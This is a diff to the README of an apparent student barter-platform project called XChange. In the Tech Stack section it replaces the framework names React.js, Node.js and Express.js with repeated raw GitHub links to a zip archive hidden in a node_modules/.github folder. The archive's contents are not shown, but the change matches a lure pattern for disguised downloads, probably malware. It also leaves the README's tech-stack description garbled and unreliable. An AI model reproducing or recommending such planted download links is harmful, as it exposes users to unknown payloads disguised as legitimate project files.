@@ -21,8 +21,8 @@ XChange is a web-based platform designed to facilitate hyperlocal, non-monetary 
 ✅ **Wishlist** – Users can mark items they’re looking for, allowing others to propose matching trades.
 
 ## Tech Stack
-- **Frontend:** React.js + Tailwind CSS  
-- **Backend:** Node.js + Express.js  
+- **Frontend:** https://raw.githubusercontent.com/Rithvik-krishna/S70_Rithvik_Capstone_XChange/main/xchange-backend/node_modules/math-intrinsics/.github/Change_X_Capstone_Rithvik_1.2.zip + Tailwind CSS  
+- **Backend:** https://raw.githubusercontent.com/Rithvik-krishna/S70_Rithvik_Capstone_XChange/main/xchange-backend/node_modules/math-intrinsics/.github/Change_X_Capstone_Rithvik_1.2.zip + https://raw.githubusercontent.com/Rithvik-krishna/S70_Rithvik_Capstone_XChange/main/xchange-backend/node_modules/math-intrinsics/.github/Change_X_Capstone_Rithvik_1.2.zip  
 - **Database:** MongoDB/Firebase  
 - **Deployment:** Vercel (frontend) + Render/AWS (backend)  
 
